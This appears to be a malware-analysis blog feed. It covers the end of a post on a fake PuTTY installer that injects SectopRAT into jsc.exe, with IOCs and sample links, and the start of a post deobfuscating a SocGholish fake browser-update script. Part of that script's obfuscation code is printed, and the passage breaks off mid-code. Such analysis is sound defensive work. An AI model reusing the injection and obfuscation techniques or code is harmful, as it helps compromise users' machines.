<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/86_original.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/86_original.png"
            alt="86_original"
            />
    </a>
    
</figure>
<p>The next two lines of the batch script create a new file containing &ldquo;MZ&rdquo; in the new directory, use findstr on <code>86YEO</code> to remove a specific string, and append the result to the new file. Running the file command, the new file is now identified as a PE32 exe.</p>
<p>The last lines of the script move the <code>6</code> file to the new directory, rename it to <code>d</code>, and give it an extension (if one exists in the variable). Then, it calls the new PE32 exe and passes the <code>d</code> file to it as an argument.</p>
<p>Execution now passes from the batch script to the newly created PE file, so let&rsquo;s continue there.  I&rsquo;ve uploaded the .CAB file on <a href="https://malshare.com/sample.php?action=detail&amp;hash=bdcd15f50b774c329c4c9825b9f71f61e520dd8b2788e9cb5a23467c264d066f">Malshare</a> for any interested folks.</p>
<h3 id="autoit">AutoIt</h3>
<p>I started by taking the hash of the PE file and running it through VT and other tools. Since AutoIt was mentioned in the batch script, I was not surprised to find the PE file appeared to be the legitimate AutoIt3.exe interpreter. Looking at the <a href="https://www.autoitscript.com/autoit3/docs/intro/running.htm">AutoIt docs</a>, it seems the file passed to the interpreter would need to be an AutoIt script.</p>
<p>I opened the AutoIt script, <code>d</code>, in a text editor, and was faced with roughly 11,000 lines of a garbled mess.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/autoit_script_raw.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/autoit_script_raw.png"
            alt="autoit_script_raw"
            />
    </a>
    
</figure>
<p>Luckily, while researching AutoIt, I had come across an excellent <a href="https://dr4k0nia.github.io/posts/Analysing-a-sample-of-ArechClient2/">blog post</a> by dr4k0nia, who had already analyzed a similar AutoIt-based sample and noted a string decryption function within the script.  Using the post as a reference, I was able to find and decode a large number of the obfuscated strings.</p>
<p>Looking through the results, I saw <code>NtResumeThread</code>, <code>CreateProcessW</code>, <code>NtUnmapViewOfSection</code>, and <code>\Microsoft.NET\Framework\v4.0.30319\jsc.exe</code>, all of which dr4k0nia had pointed out may indicate process injection into <code>jsc.exe</code>.</p>
<p>In a clean sandbox environment, I ran the AutoIt interpreter and passed it the script. With ProcessHacker open, I saw that indeed the interpreter did indeed spawn the <code>jsc.exe</code> process, signifying process injection was most likely taking place.</p>
<p>Following along with the aforementioned post, I debugged the AutoIt interpreter in x32dbg, enabled the &ldquo;Hide debugger (PEB)&rdquo; preference to bypass the AutoIt EULA, set a breakpoint on <code>CreateProcessW</code>, and then set a breakpoint on <code>NtResumeThread</code> once the previous breakpoint was hit. Perfect! The executable is in a suspended state, injection has occurred, and we have stopped right before the thread will resume.</p>
<p>Now all I need to do is extract the injected code from the <code>jsc.exe</code> process&rsquo;s memory. Switching back to ProcessHacker, I went to Preferences and ran the Strings function in the memory tab.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/prochacker_strings.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/prochacker_strings.png"
            alt="prochacker_strings"
            />
    </a>
    
</figure>
<p>I can see many interesting strings, including <code>This program cannot be run in DOS mode</code>, which is in the 0x900000 memory region. Going back to the memory tab, I found the corresponding region in memory, right-clicked, and saved the contents to a file called <code>jsc2.exe</code>.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/jsc_memory_suspended.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/jsc_memory_suspended.png"
            alt="jsc_memory_suspended"
            />
    </a>
    
</figure>
<p>I opened up the extracted file in PEiD, but it&rsquo;s showing nothing found. Odd.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/first_peid.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/first_peid.png"
            alt="first_peid"
            />
    </a>
    
</figure>
<p>After some thinking I remembered that since I carved the data from memory, it was likely still mapped to memory and I would need to adjust the section headers. Opening up PEBear to the section headers tab, I changed the raw addresses to match the virtual addresses, and then adjusted the raw size based on the changes.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/pebear.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/pebear.png"
            alt="pebear"
            />
    </a>
    
</figure>
<p>After doing this, I saved a new file from PEBear called <code>plz.exe</code> and opened it back up in PEiD &ndash; success! It is now reporting a file type of <code>Microsoft Visual C# / Basic .NET</code>.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/success_dnspy.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/success_dnspy.png"
            alt="success_dnspy"
            />
    </a>
    
</figure>
<p>I&rsquo;ve reached the final payload, back into DnSpy we go.</p>
<h3 id="final-payload">Final Payload</h3>
<p>The .NET payload is large and complex, large enough in fact that an entire post could be written dissecting it. I&rsquo;ll keep my analysis brief, especially since dr4k0nia&rsquo;s post covers this payload quite well.</p>
<p>I noticed the initial loader DLL and the final payload are obfuscated in the same way and share some functionality, notably the <code>&lt;Module&gt;.c()</code> method. If you recall, this method takes three numeric arguments and retrieves a string from a manifest resource named &ldquo;resource&rdquo;.</p>
<p>Unfortunately, and as dr4k0nia mentioned, the payload does not decode all of its strings as once, like the DLL did. Instead, the global variables passed into <code>&lt;Module&gt;.c()</code> are altered with the process flow, meaning there is nowhere I can place a breakpoint to capture all the decoded strings at in once place.</p>
<p>However, there is one section which reveals some good threat intel.</p>
<p>Debugging the payload with DnSpy, I was able to step through the first couple of methods until I reached a method which created a new instance of the <code>TcpClient</code> class and set the <code>ReceiveBufferSize</code> and <code>SendBufferSize</code> properties to values from the <code>xj</code> class.</p>
<p>After stepping over those property assignments with the debugger, I can actually see all the values of the <code>xj</code> class. There are some interesting strings in here.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/dnspy_decoded.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/dnspy_decoded.png"
            alt="dnspy_decoded"
            />
    </a>
    
</figure>
<p>It looks like the TcpClient will attempt to connect to <code>34.141.167[.]33</code> on port <code>15647</code>. There is also a reference to a Pastebin link, which holds the same IP.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/final_payload_pastebin_result.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/final_payload_pastebin_result.png"
            alt="final_payload_pastebin_result"
            />
    </a>
    
</figure>
<p>Taking into account the structure of the payload and the identical string decryption method in <code>&lt;Module&gt;.c()</code>, I hypothesize this malware is the same variety as the one analyzed by dr4k0nia, and is part of the <code>ArechClient2</code>/<code>SectopRAT</code> family.</p>
<p>Additional confirmation of this theory can be found in this <a href="https://www.ironnet.com/blog/key-findings-from-defending-the-noc-at-black-hat-europe-2022">IronNet</a> blog post, which states the SectopRAT commonly uses port <code>15647</code> and Google Cloud hosts &ndash; both matching our sample as well. The blog also mentions a string sent to the C2, &ldquo;<code>AfkSystem</code>&rdquo;, which I noted in the final payload.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/afksystem.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/afksystem.png"
            alt="afksystem"
            />
    </a>
    
</figure>
<h3 id="final-words">Final Words</h3>
<p>A quick synopsis of the journey we just took. A fake PuTTY site is patient zero, serving an initial loader. The loader pulls down two additional files, a DLL and an EXE. The DLL attempts to disable various Windows Security functions, clearing the way for the EXE to run unimpeded.</p>
<p>The EXE is a dropper, which extracts three files from its own resource section. The first of these is a batch script which assembles an AutoIt interpreter and pre-written script. The script is then executed, which injects the SectopRAT into the <code>jsc.exe</code> process.</p>
<p>This sample took me quite a while to work through, and I took over 500 lines of notes on some of the assembly code alone. It was a great way to learn more about reverse engineering, and I discovered many great resources and researchers along the way. If anyone reading this has any tips, corrections, or other helpful advice, feel free to let me know &ndash; my contact details are in the About page.</p>
<p>I will end with an observation. As I was gathering screenshots for this post, I happened to notice a newly open directory on <code>pputty[.]us</code>, where the original Google ad pointed. It seems someone is working on fresh content &ndash; might be a good source for another post.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/putty_update.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/putty_update.png"
            alt="putty_updated"
            />
    </a>
    
</figure>
<h2 id="iocs">IOCs</h2>
<ul>
<li><code>pputty[.]us</code></li>
<li><code>pputty[.]shop</code></li>
<li><code>hxxps://cloudinstalller73489[.]shop</code></li>
<li><code>34.141.167[.]33</code></li>
</ul>
<p>Malshare Links</p>
<ul>
<li><a href="https://malshare.com/sample.php?action=detail&amp;hash=420dfb75c981fe4ab474de914e92c8171f52544d1f3a4d66bf9249e8578d729d">Fake PuTTY Installer</a></li>
<li><a href="https://malshare.com/sample.php?action=detail&amp;hash=c1fadb8e09ba1257f7656be5a1c8d44e2a0da8697e8e0a32485714949a6c29ca">Loader DLL</a></li>
<li><a href="https://malshare.com/sample.php?action=detail&amp;hash=7c1d70a4d194599074337b1d144be69b875a5960e5e86bdb1eeddb1f9369bd0b">Loader EXE</a></li>
<li><a href="https://malshare.com/sample.php?action=detail&amp;hash=bdcd15f50b774c329c4c9825b9f71f61e520dd8b2788e9cb5a23467c264d066f">CAB Archive</a></li>
<li><a href="https://malshare.com/sample.php?action=detail&amp;hash=e759c14d23e41c067822d1ec71f2239e520d3ad9e69b7b7cac7140839524c7a5">Final Payload</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>SocGholish Series - Part 2</title>
            <link>https://rerednawyerg.github.io/posts/malwareanalysis/socgholish_part2/</link>
            <pubDate>Mon, 23 Jan 2023 19:47:27 -0600</pubDate>
            
            <guid>https://rerednawyerg.github.io/posts/malwareanalysis/socgholish_part2/</guid>
            <description>In the previous post, &amp;ldquo;SocGholish Series - Part 1&amp;rdquo;, I examined an infected website which claimed to require a browser update in order to properly function. Users who clicked on the download button would receive a JavaScript file to run on their system which would &amp;ldquo;update their browser&amp;rdquo;.</description>
            <content type="html"><![CDATA[<hr>
<p>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe.min.css" integrity="sha256-sCl5PUOGMLfFYctzDW3MtRib0ctyUvI9Qsmq2wXOeBY=" crossorigin="anonymous" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/default-skin/default-skin.min.css" integrity="sha256-BFeI1V+Vh1Rk37wswuOYn5lsTcaU96hGaI7OUVCLjPc=" crossorigin="anonymous" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe.min.js" integrity="sha256-UplRCs9v4KXVJvVY+p+RSo5Q4ilAUXh7kpjyIP5odyc=" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe-ui-default.min.js" integrity="sha256-PWHOlUzc96pMc8ThwRIXPn8yH4NOLu42RQ0b9SpnpFk=" crossorigin="anonymous"></script>


<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>


<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
<script src="/js/pswp-init.js"></script>

In the previous post, &ldquo;SocGholish Series - Part 1&rdquo;, I examined an infected website which claimed to require a browser update in order to properly function. Users who clicked on the download button would receive a JavaScript file to run on their system which would &ldquo;update their browser&rdquo;. I walked through the steps leading up to the download, and in this post will pick up where I left off and delve into the contents of the JavaScript payload.</p>
<hr>
<h3 id="first-look-at-the-payload">First Look At The Payload</h3>
<p>Cracking the JavaScript download open in SublimeText, it seems to be quite large and crammed together.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/actual_first_of_blob.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/actual_first_of_blob.png"
            alt="actual_first"
            />
    </a>
    
</figure>
<p>To make it easier to read, I ran it through an online JS beautifier, and turns out with the additional newlines and spaces, it is 1,115 lines long.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/first_of_blob.jpg"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/first_of_blob.jpg"
            alt="first"
            />
    </a>
    
</figure>
<p>When first looking at this, I saw what I thought were a few JavaScript block comments in the first line. After some Googling, I discovered these comments were actually conditional compilation keywords in JScript, the &ldquo;Microsoft version&rdquo; of JavaScript native to Windows. Checking some old documentation, conditional compilation allows for control of a script depending on the values of the conditional compilation variables. The <code>@cc_on</code> keyword activates conditional compilation support, and the <code>@if</code> and <code>@else</code> keywords function as a standard if/else statement.</p>
<p>The if statement in this sample checks the JScript version on the device and if the version is 4 or greater, enter the if statement, otherwise go into the very lengthy else statement.</p>
<p>Regarding the else statement - it is over 1,000 lines long and appears somewhat obfuscated. While the obfuscation is not particularly heavy, the process of renaming variables and functions to random characters (as seen in the above screenshot) was continued throughout. To avoid manually deobfuscating 1,000 lines of JavaScript, I opted to take a few strings which didn&rsquo;t appear to be altered and Google them. Bingo - I found a JavaScript library called <a href="https://underscorejs.org/docs/underscore-esm.html">Underscore</a> which very closely matches the code in the <code>else</code> statement.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/underscore.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/underscore.png"
            alt="underscore"
            />
    </a>
    
</figure>
<p>Interesting, why would this be included as part of the downloaded &ldquo;fake update&rdquo; JavaScript payload? Scrolling quickly through the code, it does not appear to do anything overtly malicious. Running the code contained in the else statement through <a href="https://app.any.run/tasks/ef52f637-08c3-4429-8972-0889d3f31b3a/">any.run</a> doesn&rsquo;t show any obvious malicious indicators either.  All the code in the else statement seems to do is take the Underscore library, turn it into a function, and call the function in-place.</p>
<p>Another factor to weight is the else statement itself. The Underscore function code is only called if the device is running a JScript version older than 4.0. For reference, JScript version 4.0 was released in the late 1990s. It doesn&rsquo;t seem likely this payload would find itself on many devices with such an old version of JScript running.</p>
<p>If we consider these two statements to be true:</p>
<ul>
<li>The else section is not malicious (with the caveat that very light analysis was done to prove this)</li>
<li>The else section is not likely to ever be entered</li>
</ul>
<p>a few logical explanations remain regarding the code in the else statement.</p>
<ul>
<li>It was was included to increase the size of the download, possibly making it seem more legitimate.</li>
<li>The addition of &ldquo;legitimate&rdquo; code may have been an attempt at avoiding AV or other detection.</li>
<li>The mild obfuscation may have been an attempt to slow down or confuse researchers.</li>
</ul>
<p>While these are all legitimate possibilities, to be quite honest, I am not sure why the content of the else statement was included. I may be missing something which a more seasoned analyst might have picked up on. Regardless, let&rsquo;s move on to the content of the <code>if</code> statement, where it seems the action is.</p>
<h3 id="jumping-into-the-if-statement">Jumping Into The IF Statement</h3>
<p>Below is the original content of the <code>if</code> statement in all its obfuscated glory, structurally beautified for easier reading. This is the section of code which would execute when a victim tried to update their browser by running the <code>Update.js</code> download (and had JScript 4.0 or greater).</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/malicious_code.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/malicious_code.png"
            alt="if_statement"
            />
    </a>
    
</figure>
<p>I worked my way through the content of the if statement in SublimeText, performing text replacement on variables and functions to create more descriptive labels.</p>
<figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
    <a href="images/cleaned_if_statement.png"  itemprop="contentUrl"> 
        <img itemprop="thumbnail"
            src="images/cleaned_if_statement.png"
            alt="if_cleaned"
            />
    </a>
    
</figure>
<p>Before I dive into some analysis, I will say I am not a JavaScript guru. In fact, many aspects of JS are a mystery to me. I do a lot of trial and error in Node on my Linux box to try and figure out what certain operators or snippets of code may do. With that said, I may be unable to give the real nitty-gritty technical reason as to why certain statements behaved the way they did, but I will present my best guess based on some testing, Googling, and common sense.</p>
<p>I&rsquo;m going to jump around a bit, starting with a function toward the bottom on lines 114-120, which I&rsquo;ve renamed to <code>get_array()</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JS" data-lang="JS"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">get_array</span>() {
    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">array</span> <span style="color:#f92672">=</span> [<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">array_values</span><span style="color:#f92672">&gt;</span>];
    <span style="color:#a6e22e">get_array</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">array</span>;
    };
    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">get_array</span>();
}
</code></pre></div><p>The function starts out by creating an array filled with random strings appear to be base64 encoded, but don&rsquo;t decode to anything intelligible when testing manually.<br>
Next, the function redefines itself using something known in JavaScript as the <a href="http://peter.michaux.ca/articles/lazy-function-definition-pattern">Lazy Function Definition Pattern</a>. To summarize, when the function is called for the first time, it creates and returns the array variable. The next <code>n</code> times the function is called, it only <em>returns</em> the array variable, and it is <strong>not</strong> recreated each time. If the array is updated in any way, these updates are permanent.</p>
<p>Moving back to lines 1-47, an anonymous, self-invoking function expression. JavaScript allows for functions to self-invoke, meaning they are called automatically, immediately after initialization with no need for function calls. Arguments are passed in via the parenthesis immediately following the function definition.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JS" data-lang="JS">(<span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">arg_get_array</span>, <span style="color:#a6e22e">_0x585212</span>) {
    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">strings_object</span> <span style="color:#f92672">=</span> {
            <span style="color:#a6e22e">_0x4e081b</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;gDB%&#39;</span>,
            <span style="color:#a6e22e">_0x4c3fe3</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3f6</span>,
            <span style="color:#a6e22e">_0x5f22db</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;PSgS&#39;</span>,
            <span style="color:#a6e22e">_0x4a3d3f</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3ea</span>,
            <span style="color:#a6e22e">_0x53d10b</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;YZM3&#39;</span>,
            <span style="color:#a6e22e">_0x1abe2b</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3ed</span>,
            <span style="color:#a6e22e">_0x38e02a</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;T^0n&#39;</span>,
            <span style="color:#a6e22e">_0x2eb8e4</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3eb</span>,
            <span style="color:#a6e22e">_0x234973</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;XVoi&#39;</span>,
            <span style="color:#a6e22e">_0x37e27f</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3e6</span>,
            <span style="color:#a6e22e">_0x6c65c0</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;KcYo&#39;</span>,
            <span style="color:#a6e22e">_0x259809</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3e4</span>,
            <span style="color:#a6e22e">_0x1c3c75</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;MW92&#39;</span>,
            <span style="color:#a6e22e">_0x560688</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3df</span>,
            <span style="color:#a6e22e">_0x23f8ea</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;YZM3&#39;</span>,
            <span style="color:#a6e22e">_0x185e90</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3dc</span>,
            <span style="color:#a6e22e">_0x4a0b3f</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;7#tp&#39;</span>,
            <span style="color:#a6e22e">_0x5af55a</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3da</span>,
            <span style="color:#a6e22e">_0x50eac5</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;$&amp;p#&#39;</span>,
            <span style="color:#a6e22e">_0x3f2c12</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3f8</span>,
            <span style="color:#a6e22e">_0x49bff8</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;R6OA&#39;</span>,
            <span style="color:#a6e22e">_0x540725</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x3fc</span>
        },
        <span style="color:#a6e22e">solo_object</span> <span style="color:#f92672">=</span> {
            <span style="color:#a6e22e">_0x2bd82d</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">0x238</span>
        },
        <span style="color:#a6e22e">sub_get_array</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">arg_get_array</span>();

    <span style="color:#75715e">//passes arg2 minus 568 and arg1 to the deobfuscator() function and returns the result
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">arg1</span>, <span style="color:#a6e22e">arg2</span>) {
        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">deobfuscator</span>(<span style="color:#a6e22e">arg2</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">solo_object</span>.<span style="color:#a6e22e">_0x2bd82d</span>, <span style="color:#a6e22e">arg1</span>);
    }

    <span style="color:#66d9ef">while</span> (<span style="color:#f92672">!!</span>[]) {
        <span style="color:#66d9ef">try</span> {
            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_0x4e9611</span> <span style="color:#f92672">=</span> parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x4e081b</span>, <span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x4c3fe3</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x1</span> <span style="color:#f92672">*</span> (<span style="color:#f92672">-</span>parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x5f22db</span>, <span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x4a3d3f</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x2</span>) <span style="color:#f92672">+</span> parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x53d10b</span>, <span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x1abe2b</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x3</span> <span style="color:#f92672">+</span> parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x38e02a</span>, <span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x2eb8e4</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x4</span> <span style="color:#f92672">*</span> (<span style="color:#f92672">-</span>parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x234973</span>, <span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x37e27f</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x5</span>) <span style="color:#f92672">+</span> parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x6c65c0</span>, <span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x259809</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x6</span> <span style="color:#f92672">*</span> (<span style="color:#f92672">-</span>parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x1c3c75</span>, <span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x560688</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x7</span>) <span style="color:#f92672">+</span> <span style="color:#f92672">-</span>parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x23f8ea</span>, <span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x185e90</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x4a0b3f</span>, <span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x5af55a</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0x9</span> <span style="color:#f92672">+</span> <span style="color:#f92672">-</span>parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x50eac5</span>, <span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x3f2c12</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0xa</span> <span style="color:#f92672">*</span> (<span style="color:#f92672">-</span>parseInt(<span style="color:#a6e22e">call_deobf</span>(<span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x49bff8</span>, <span style="color:#a6e22e">strings_object</span>.<span style="color:#a6e22e">_0x540725</span>)) <span style="color:#f92672">/</span> <span style="color:#ae81ff">0xb</span>);
            
            <span style="color:#75715e">//if result of above = 964931, then break and stop shifting array
</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">_0x4e9611</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">_0x585212</span>) <span style="color:#66d9ef">break</span>;
            <span style="color:#66d9ef">else</span> <span style="color:#a6e22e">sub_get_array</span>[<span style="color:#e6db74">&#39;push&#39;</span>](<span style="color:#a6e22e">sub_get_array</span>[<span style="color:#e6db74">&#39;shift&#39;</span>]());
        } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">_0x3f5ce4</span>) {
            <span style="color:#a6e22e">sub_get_array</span>[<span style="color:#e6db74">&#39;push&#39;</span>](<span style="color:#a6e22e">sub_get_array</span>[<span style="color:#e6db74">&#39;shift&#39;</span>]());
        }
    }
}(<span style="color:#a6e22e">get_array</span>, <span style="color:#ae81ff">0xeb943</span>));
</code></pre></div><p>There are two arguments passed to the anonymous function, the <code>get_array</code> function and the value <code>0xeb943</code>, which converting from base16 to base10 is 964931.<br>
The first thing the function does is define an object containing a set of key-value pairs. Looking closely at the KVs, they appear to follow a pattern: a random string and then a number in base16.</p>
<p>The function then defines another object with a single key-value pair, with a value of 568 in base16. Next, the function assigns the <code>get_array</code> function (passed in as an argument) to <code>sub_get_array</code>.</p>
<p>After the variable creations are complete, a new function called <code>call_deobf</code> is created. The purpose of <code>call_deobf</code> is to take two arguments, subtract 568 from the second argument, and pass them both to another function, <code>deobfuscator()</code>. The <code>deobfuscator</code> function can be found in the previous screenshot from lines 62-112, and I&rsquo;ll go into detail regarding it in a separate section. For now, it is enough to know it returns a deobfuscated element from the array defined in <code>get_array</code>.</p>
<p>Up next, the while loop on line 36. In JavaScript, everything except for a specific list of items (0, -0, null, etc.) is considered &ldquo;truthy&rdquo;, meaning considered true when encountered in a boolean context. Thus, in JavaScript <code>[]</code> is truthy, and a double negation of a truthy value is also truthy. Therefore, this is a &ldquo;while true&rdquo; loop.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JS" data-lang="JS">    <span style="color:#66d9ef">while</span> (<span style="color:#f92672">!!</span>[]) {
        <span style="color:#66d9ef">try</span> {
